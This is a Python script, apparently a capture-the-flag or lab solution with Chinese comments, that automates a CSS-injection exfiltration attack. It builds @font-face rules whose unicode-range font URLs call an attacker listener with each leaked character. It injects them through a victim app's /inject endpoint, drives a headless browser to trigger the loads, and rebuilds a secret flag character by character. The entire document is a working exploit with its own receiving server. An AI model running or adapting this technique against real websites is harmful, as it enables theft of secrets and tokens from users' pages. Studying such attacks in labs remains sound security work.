import requests
import string
import time
import threading
import os
from flask import Flask, request, cli
import sys

# --- 检查并导入Selenium ---
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.chrome.options import Options as ChromeOptions
except ImportError:
    print("[!] Selenium或其相关模块未安装。")
    print("[!] 请运行 'pip install selenium' 来安装它。")
    exit()

# --- 配置 ---
VICTIM_URL = "http://127.0.0.1:5001" # 假设受害者服务器端口不变
ATTACKER_HOST = "127.0.0.1"
ATTACKER_PORT = 8000
# 调试开关：设置为False会弹出浏览器窗口，方便观察
HEADLESS_MODE = True

# --- 全局共享变量 ---
leaked_character = None

# --- 监听服务器部分 (无需修改) ---
app = Flask(__name__)
# 减少Flask在控制台的日志输出
cli.show_server_banner = lambda *args: None
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def leak_receiver(path):
    global leaked_character
    char = request.args.get('leak')
    if char:
        # 只有在攻击循环中才打印，避免健康检查的干扰
        if '正在猜测' in last_status_message:
            print(f"\n[监听服务器]: 收到泄露请求! Leak: '{char}'")
        leaked_character = char
    return "OK", 200

def run_listener_server():
    """在后台线程中运行监听服务器"""
    app.run(host=ATTACKER_HOST, port=ATTACKER_PORT)

# --- 全自动攻击逻辑 ---
last_status_message = ""
def start_automated_attack():
    global leaked_character, last_status_message
    
    # -- 初始化Selenium WebDriver --
    print("[*] 正在初始化自动化浏览器 (Selenium)...")
    chrome_options = ChromeOptions()
    if HEADLESS_MODE:
        chrome_options.add_argument("--headless")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    
    driver_path = "./chromedriver"
    if not os.path.exists(driver_path) and not os.path.exists(driver_path + '.exe'):
         print(f"[!] 错误: 在 '{driver_path}' 未找到ChromeDriver。")
         return

    service = ChromeService(executable_path=driver_path)
    try:
        driver = webdriver.Chrome(service=service, options=chrome_options)
    except Exception as e:
        print(f"[!] 初始化WebDriver失败: {e}")
        return
        
    print("[*] 自动化浏览器初始化成功！")

    # -- 开始攻击循环 --
    charset = string.ascii_letters + string.digits + "_-!{}"
    leaked_flag = ""
    char_index = 1 # 从第一个<span>开始

    print(f"[*] 全自动攻击开始... 目标: {VICTIM_URL}")
    print("-" * 50)

    while True: # 无限循环，直到找不到下一个字符
        leaked_character = None
        
        # 1. ★★★ 构建基于@font-face和unicode-range的CSS Payload ★★★
        font_faces = []
        font_names = []
        for char in charset:
            char_code = ord(char)
            # U+41, U+57 这种格式
            unicode_val = f"U+{char_code:X}" 
            font_name = f"leakfont{char_code}"
            font_names.append(f"'{font_name}'")

            font_face_rule = f"""
            @font-face {{
              font-family: '{font_name}';
              unicode-range: {unicode_val};
              src: url('http://{ATTACKER_HOST}:{ATTACKER_PORT}/?leak={char}');
            }}
            """
            font_faces.append(font_face_rule)
        
        all_font_names_str = ", ".join(font_names)
        # 将所有“探测字体”应用到当前要猜测的span上
        span_rule = f"""
        #secret span:nth-child({char_index}) {{
          font-family: {all_font_names_str}, sans-serif;
        }}
        """
        css_payload = "\n".join(font_faces) + "\n" + span_rule
        
        # 2. 注入CSS
        last_status_message = f"[*] 正在猜测第 {char_index} 个字符..."
        print(last_status_message, end="")
        sys.stdout.flush()
        try:
            requests.post(f"{VICTIM_URL}/inject", data={'css': css_payload}, timeout=2)
        except requests.exceptions.RequestException:
            print(f"\n[!] 注入CSS失败。请确认app.py正在运行。")
            driver.quit()
            return

        # 3. 自动化触发泄露
        driver.get(f"{VICTIM_URL}/victim")
        
        # 4. 轮询等待结果
        found_this_round = False
        for _ in range(30): # 轮询3秒
            if leaked_character:
                found_this_round = True
                break
            time.sleep(0.1)

        # 5. 处理结果
        if found_this_round:
            leaked_flag += leaked_character
            sys.stdout.write(f"\r[+] 成功! Flag: {leaked_flag}{' ' * 20}\n")
            sys.stdout.flush()

            if leaked_character == '}':
                print("\n" + "=" * 50)
                print(f"🎉 攻击完成! 完整Flag: {leaked_flag}")
                print("=" * 50)
                break # 找到结束符，攻击成功
            
            char_index += 1 # 移动到下一个字符位置
        else:
            # 如果等待超时后仍未收到字符，说明flag已经结束
            print(f"\n[!] 在位置 {char_index} 未找到下一个字符，攻击结束。")
            print("\n" + "=" * 50)
            print(f"🎉 最终窃取到的Flag: {leaked_flag}")
            print("=" * 50)
            break
            
    # 6. 清理资源
    driver.quit()
    print("\n[*] 自动化浏览器已关闭。")
    os._exit(0)

if __name__ == '__main__':
    # 启动后台监听服务器
    listener_thread = threading.Thread(target=run_listener_server, daemon=True)
    listener_thread.start()
    
    # 循环检查，直到监听服务器成功启动并响应
    print("[*] 等待监听服务器上线...")
    while True:
        try:
            requests.get(f"http://{ATTACKER_HOST}:{ATTACKER_PORT}/", timeout=1)
            print("[*] 监听服务器已上线！")
            break
        except requests.ConnectionError:
            time.sleep(0.2)

    # 启动主攻击逻辑
    start_automated_attack()
